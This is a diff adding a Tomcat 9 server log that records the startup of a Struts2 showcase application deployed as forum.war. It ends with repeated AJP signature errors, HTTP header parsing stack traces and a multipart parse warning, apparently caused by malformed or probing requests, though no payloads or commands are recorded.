@@ -1,0 +1,254 @@
+/usr/local/tomcat/bin/catalina.sh: 1: eval: /usr/lib/jvm/jdk1.8.0_171/bin/java: not found
+15-Nov-2021 06:47:17.294 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version:        Apache Tomcat/9.0.0.M26
+15-Nov-2021 06:47:17.308 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Aug 2 2017 20:29:05 UTC
+15-Nov-2021 06:47:17.308 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server number:         9.0.0.0
+15-Nov-2021 06:47:17.308 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
+15-Nov-2021 06:47:17.308 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.4.0-90-generic
+15-Nov-2021 06:47:17.308 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
+15-Nov-2021 06:47:17.308 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/jdk1.8.0_311/jre
+15-Nov-2021 06:47:17.308 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_311-b11
+15-Nov-2021 06:47:17.309 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Oracle Corporation
+15-Nov-2021 06:47:17.309 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /usr/local/tomcat
+15-Nov-2021 06:47:17.309 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /usr/local/tomcat
+15-Nov-2021 06:47:17.309 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties
+15-Nov-2021 06:47:17.309 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
+15-Nov-2021 06:47:17.309 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
+15-Nov-2021 06:47:17.309 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
+15-Nov-2021 06:47:17.309 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/usr/local/tomcat
+15-Nov-2021 06:47:17.309 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/usr/local/tomcat
+15-Nov-2021 06:47:17.309 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/usr/local/tomcat/temp
+15-Nov-2021 06:47:17.309 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent The APR based Apache Tomcat Native library which allows optimal performance in production environments was not found on the java.library.path: [/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib]
+15-Nov-2021 06:47:17.844 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-nio-8080"]
+15-Nov-2021 06:47:17.939 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
+15-Nov-2021 06:47:17.945 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["ajp-nio-8009"]
+15-Nov-2021 06:47:17.945 INFO [main] org.apache.tomcat.util.net.NioSelectorPool.getSharedSelector Using a shared selector for servlet write/read
+15-Nov-2021 06:47:17.947 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 1777 ms
+15-Nov-2021 06:47:18.017 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service [Catalina]
+15-Nov-2021 06:47:18.018 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet Engine: Apache Tomcat/9.0.0.M26
+15-Nov-2021 06:47:18.036 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deploying configuration descriptor [/usr/local/tomcat/conf/Catalina/localhost/manager.xml]
+15-Nov-2021 06:47:18.103 WARNING [main] org.apache.catalina.startup.HostConfig.deployDescriptor A docBase [/usr/local/tomcat/webapps/manager] inside the host appBase has been specified, and will be ignored
+15-Nov-2021 06:47:18.922 INFO [main] org.apache.catalina.startup.HostConfig.deployDescriptor Deployment of configuration descriptor [/usr/local/tomcat/conf/Catalina/localhost/manager.xml] has finished in [878] ms
+15-Nov-2021 06:47:18.930 INFO [main] org.apache.catalina.startup.HostConfig.deployWAR Deploying web application archive [/usr/local/tomcat/webapps/forum.war]
+15-Nov-2021 06:47:21.179 INFO [main] org.apache.jasper.servlet.TldScanner.scanJars At least one JAR was scanned for TLDs yet contained no TLDs. Enable debug logging for this logger for a complete list of JARs that were scanned but no TLDs were found in them. Skipping unneeded JARs during scanning can improve startup time and JSP compilation time.
+2021-11-15 06:47:21,374  INFO (org.springframework.web.context.ContextLoader:187) - Root WebApplicationContext: initialization started
+2021-11-15 06:47:21,403  INFO (org.springframework.web.context.support.XmlWebApplicationContext:456) - Refreshing Root WebApplicationContext: startup date [Mon Nov 15 06:47:21 EST 2021]; root of context hierarchy
+2021-11-15 06:47:21,463  INFO (org.springframework.beans.factory.xml.XmlBeanDefinitionReader:315) - Loading XML bean definitions from ServletContext resource [/WEB-INF/applicationContext.xml]
+2021-11-15 06:47:21,823  INFO (org.springframework.context.annotation.ClassPathBeanDefinitionScanner:178) - JSR-250 'javax.annotation.ManagedBean' found and supported for component scanning
+2021-11-15 06:47:22,196  INFO (org.springframework.beans.factory.support.DefaultListableBeanFactory:555) - Pre-instantiating singletons in org.springframework.beans.factory.support.DefaultListableBeanFactory@4ea1aa52: defining beans [testDataProvider,memoryStorage,personManager,employeeDao,skillDao,org.springframework.context.annotation.internalConfigurationAnnotationProcessor,org.springframework.context.annotation.internalAutowiredAnnotationProcessor,org.springframework.context.annotation.internalRequiredAnnotationProcessor,org.springframework.context.annotation.internalCommonAnnotationProcessor,customFreemarkerManager,customFreemarkerManagerUtil,chatService,chatLoginAction,chatLogoutAction,usersAvailableAction,roomsAvailableAction,crudRoomAction,enterRoomAction,messagesAvailableInRoomAction,sendMessageToRoomAction,usersAvailableInRoomAction,exitRoomAction,hangmanService,startHangmanAction,guessCharacterAction,getUpdatedHangmanAction]; root of factory hierarchy
+2021-11-15 06:47:22,273  INFO (org.apache.struts2.showcase.application.TestDataProvider:84) - TestDataProvider - [addTestSkills]: Added test skill data.
+2021-11-15 06:47:22,273  INFO (org.apache.struts2.showcase.application.TestDataProvider:97) - TestDataProvider - [addTestEmployees]: Added test employee data.
+2021-11-15 06:47:22,375  INFO (org.springframework.web.context.ContextLoader:214) - Root WebApplicationContext: initialization completed in 1000 ms
+2021-11-15 06:47:22,433  INFO (org.apache.myfaces.config.FacesConfigurator:140) - Reading standard config org/apache/myfaces/resource/standard-faces-config.xml
+2021-11-15 06:47:22,531  WARN (org.apache.myfaces.shared_impl.util.LocaleUtils:52) - Locale name in faces-config.xml null or empty, setting locale to default locale : en_US
+2021-11-15 06:47:22,644  INFO (org.apache.myfaces.webapp.StartupServletContextListener:81) - ServletContext '/usr/local/tomcat/webapps/forum/' initialized.
+2021-11-15 06:47:22,666  INFO (org.apache.tiles.impl.BasicTilesContainer:125) - Initializing Tiles2 container. . .
+2021-11-15 06:47:22,758  INFO (org.apache.tiles.impl.BasicTilesContainer:409) - Tiles2 container initialization complete.
+2021-11-15 06:47:22,759  INFO (org.apache.tiles.access.TilesAccess:95) - Publishing TilesContext for context: org.apache.catalina.core.ApplicationContextFacade
+2021-11-15 06:47:23,057  INFO (com.opensymphony.xwork2.config.providers.XmlConfigurationProvider:42) - Parsing configuration file [struts-default.xml]
+2021-11-15 06:47:23,218  INFO (com.opensymphony.xwork2.config.providers.XmlConfigurationProvider:42) - Parsing configuration file [struts-plugin.xml]
+2021-11-15 06:47:23,413  INFO (com.opensymphony.xwork2.config.providers.XmlConfigurationProvider:42) - Parsing configuration file [struts.xml]
+2021-11-15 06:47:23,418  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (spring) for (com.opensymphony.xwork2.ObjectFactory)
+2021-11-15 06:47:23,418  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.FileManagerFactory)
+2021-11-15 06:47:23,418  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.impl.XWorkConverter)
+2021-11-15 06:47:23,418  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.impl.CollectionConverter)
+2021-11-15 06:47:23,418  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.impl.ArrayConverter)
+2021-11-15 06:47:23,418  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.impl.DateConverter)
+2021-11-15 06:47:23,419  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.impl.NumberConverter)
+2021-11-15 06:47:23,419  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.impl.StringConverter)
+2021-11-15 06:47:23,419  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.ConversionPropertiesProcessor)
+2021-11-15 06:47:23,419  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.ConversionFileProcessor)
+2021-11-15 06:47:23,419  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.ConversionAnnotationProcessor)
+2021-11-15 06:47:23,419  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.TypeConverterCreator)
+2021-11-15 06:47:23,419  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.TypeConverterHolder)
+2021-11-15 06:47:23,419  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.TextProvider)
+2021-11-15 06:47:23,419  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.LocaleProvider)
+2021-11-15 06:47:23,419  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.ActionProxyFactory)
+2021-11-15 06:47:23,419  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.ObjectTypeDeterminer)
+2021-11-15 06:47:23,420  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (org.apache.struts2.dispatcher.mapper.ActionMapper)
+2021-11-15 06:47:23,420  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (jakarta) for (org.apache.struts2.dispatcher.multipart.MultiPartRequest)
+2021-11-15 06:47:23,421  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (org.apache.struts2.views.velocity.VelocityManager)
+2021-11-15 06:47:23,421  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (org.apache.struts2.components.UrlRenderer)
+2021-11-15 06:47:23,421  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.validator.ActionValidatorManager)
+2021-11-15 06:47:23,421  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.util.ValueStackFactory)
+2021-11-15 06:47:23,421  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.util.reflection.ReflectionProvider)
+2021-11-15 06:47:23,421  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.util.reflection.ReflectionContextFactory)
+2021-11-15 06:47:23,421  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.util.PatternMatcher)
+2021-11-15 06:47:23,421  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (org.apache.struts2.dispatcher.StaticContentLoader)
+2021-11-15 06:47:23,421  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.UnknownHandlerManager)
+2021-11-15 06:47:23,422  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (org.apache.struts2.views.util.UrlHelper)
+2021-11-15 06:47:23,422  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.util.TextParser)
+2021-11-15 06:47:23,424  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Loading global messages from [globalMessages]
+2021-11-15 06:47:23,446  INFO (org.apache.struts2.spring.StrutsSpringObjectFactory:42) - Initializing Struts-Spring integration...
+2021-11-15 06:47:23,446  INFO (com.opensymphony.xwork2.spring.SpringObjectFactory:42) - Setting autowire strategy to name
+2021-11-15 06:47:23,447  INFO (org.apache.struts2.spring.StrutsSpringObjectFactory:42) - ... initialized Struts-Spring integration successfully
+2021-11-15 06:47:24,422  INFO (org.apache.myfaces.webapp.StartupServletContextListener:73) - MyFaces already initialized
+2021-11-15 06:47:24,423  INFO (org.apache.myfaces.webapp.StartupServletContextListener:81) - ServletContext '/usr/local/tomcat/webapps/forum/' initialized.
+2021-11-15 06:47:24,447  INFO (com.opensymphony.xwork2.config.providers.XmlConfigurationProvider:42) - Parsing configuration file [struts-default.xml]
+2021-11-15 06:47:24,481  INFO (com.opensymphony.xwork2.config.providers.XmlConfigurationProvider:42) - Parsing configuration file [struts-plugin.xml]
+2021-11-15 06:47:24,552  INFO (com.opensymphony.xwork2.config.providers.XmlConfigurationProvider:42) - Parsing configuration file [struts.xml]
+2021-11-15 06:47:24,552  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (spring) for (com.opensymphony.xwork2.ObjectFactory)
+2021-11-15 06:47:24,552  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.FileManagerFactory)
+2021-11-15 06:47:24,553  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.impl.XWorkConverter)
+2021-11-15 06:47:24,559  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.impl.CollectionConverter)
+2021-11-15 06:47:24,559  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.impl.ArrayConverter)
+2021-11-15 06:47:24,559  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.impl.DateConverter)
+2021-11-15 06:47:24,559  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.impl.NumberConverter)
+2021-11-15 06:47:24,560  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.impl.StringConverter)
+2021-11-15 06:47:24,560  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.ConversionPropertiesProcessor)
+2021-11-15 06:47:24,560  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.ConversionFileProcessor)
+2021-11-15 06:47:24,560  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.ConversionAnnotationProcessor)
+2021-11-15 06:47:24,560  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.TypeConverterCreator)
+2021-11-15 06:47:24,560  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.TypeConverterHolder)
+2021-11-15 06:47:24,561  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.TextProvider)
+2021-11-15 06:47:24,561  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.LocaleProvider)
+2021-11-15 06:47:24,561  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.ActionProxyFactory)
+2021-11-15 06:47:24,561  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.conversion.ObjectTypeDeterminer)
+2021-11-15 06:47:24,561  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (org.apache.struts2.dispatcher.mapper.ActionMapper)
+2021-11-15 06:47:24,561  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (jakarta) for (org.apache.struts2.dispatcher.multipart.MultiPartRequest)
+2021-11-15 06:47:24,562  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (org.apache.struts2.views.velocity.VelocityManager)
+2021-11-15 06:47:24,562  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (org.apache.struts2.components.UrlRenderer)
+2021-11-15 06:47:24,562  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.validator.ActionValidatorManager)
+2021-11-15 06:47:24,562  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.util.ValueStackFactory)
+2021-11-15 06:47:24,563  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.util.reflection.ReflectionProvider)
+2021-11-15 06:47:24,563  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.util.reflection.ReflectionContextFactory)
+2021-11-15 06:47:24,563  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.util.PatternMatcher)
+2021-11-15 06:47:24,563  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (org.apache.struts2.dispatcher.StaticContentLoader)
+2021-11-15 06:47:24,563  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.UnknownHandlerManager)
+2021-11-15 06:47:24,563  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (org.apache.struts2.views.util.UrlHelper)
+2021-11-15 06:47:24,563  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Choosing bean (struts) for (com.opensymphony.xwork2.util.TextParser)
+2021-11-15 06:47:24,564  INFO (org.apache.struts2.config.BeanSelectionProvider:42) - Loading global messages from [globalMessages]
+2021-11-15 06:47:24,564  INFO (org.apache.struts2.spring.StrutsSpringObjectFactory:42) - Initializing Struts-Spring integration...
+2021-11-15 06:47:24,564  INFO (com.opensymphony.xwork2.spring.SpringObjectFactory:42) - Setting autowire strategy to name
+2021-11-15 06:47:24,564  INFO (org.apache.struts2.spring.StrutsSpringObjectFactory:42) - ... initialized Struts-Spring integration successfully
+15-Nov-2021 06:47:25.311 INFO [main] org.apache.catalina.startup.HostConfig.deployWAR Deployment of web application archive [/usr/local/tomcat/webapps/forum.war] has finished in [6,382] ms
+15-Nov-2021 06:47:25.316 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-nio-8080"]
+15-Nov-2021 06:47:25.350 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["ajp-nio-8009"]
+15-Nov-2021 06:47:25.382 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 7434 ms
+15-Nov-2021 06:53:31.829 SEVERE [ajp-nio-8009-exec-2] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [18245]
+15-Nov-2021 06:53:31.844 SEVERE [ajp-nio-8009-exec-3] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [5635]
+15-Nov-2021 06:53:31.846 SEVERE [ajp-nio-8009-exec-4] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [32926]
+15-Nov-2021 06:53:31.850 SEVERE [ajp-nio-8009-exec-5] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [18245]
+15-Nov-2021 06:53:31.896 INFO [http-nio-8080-exec-4] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP header parsing errors will be logged at DEBUG level.
+ java.lang.IllegalArgumentException: Invalid character found in the HTTP protocol
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:513)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:380)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:796)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1374)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.lang.Thread.run(Thread.java:748)
+
+15-Nov-2021 06:53:37.064 INFO [http-nio-8080-exec-5] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP header parsing errors will be logged at DEBUG level.
+ java.lang.IllegalArgumentException: Invalid character found in method name. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:406)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:380)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:796)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1374)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.lang.Thread.run(Thread.java:748)
+
+15-Nov-2021 06:54:14.713 SEVERE [ajp-nio-8009-exec-1] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [18245]
+15-Nov-2021 06:54:14.719 SEVERE [ajp-nio-8009-exec-2] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [5635]
+15-Nov-2021 06:54:14.724 SEVERE [ajp-nio-8009-exec-3] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [32926]
+15-Nov-2021 06:54:14.727 SEVERE [ajp-nio-8009-exec-4] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [18245]
+15-Nov-2021 06:54:19.882 INFO [http-nio-8080-exec-11] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP header parsing errors will be logged at DEBUG level.
+ java.lang.IllegalArgumentException: Invalid character found in method name. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:406)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:380)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:796)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1374)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.lang.Thread.run(Thread.java:748)
+
+15-Nov-2021 06:54:19.949 INFO [http-nio-8080-exec-5] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP header parsing errors will be logged at DEBUG level.
+ java.lang.IllegalArgumentException: Invalid character found in method name. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:406)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:380)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:796)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1374)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.lang.Thread.run(Thread.java:748)
+
+15-Nov-2021 06:56:30.790 SEVERE [ajp-nio-8009-exec-1] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [18245]
+15-Nov-2021 06:56:30.803 INFO [http-nio-8080-exec-2] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP header parsing errors will be logged at DEBUG level.
+ java.lang.IllegalArgumentException: Invalid character found in the HTTP protocol
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:513)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:380)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:796)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1374)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.lang.Thread.run(Thread.java:748)
+
+15-Nov-2021 06:56:30.805 SEVERE [ajp-nio-8009-exec-2] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [5635]
+15-Nov-2021 06:56:30.812 SEVERE [ajp-nio-8009-exec-3] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [32926]
+15-Nov-2021 06:56:30.818 SEVERE [ajp-nio-8009-exec-4] org.apache.coyote.ajp.AjpMessage.processHeader Invalid message received with signature [18245]
+15-Nov-2021 06:56:36.021 INFO [http-nio-8080-exec-4] org.apache.coyote.http11.Http11Processor.service Error parsing HTTP request header
+ Note: further occurrences of HTTP header parsing errors will be logged at DEBUG level.
+ java.lang.IllegalArgumentException: Invalid character found in method name. HTTP method names must be tokens
+	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:406)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:380)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:796)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1374)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.lang.Thread.run(Thread.java:748)
+
+2021-11-15 07:02:59,768  INFO (org.apache.struts2.dispatcher.Dispatcher:42) - Unable to find 'struts.multipart.saveDir' property setting. Defaulting to javax.servlet.context.tempdir
+2021-11-15 07:02:59,802  WARN (org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest:64) - Unable to parse request
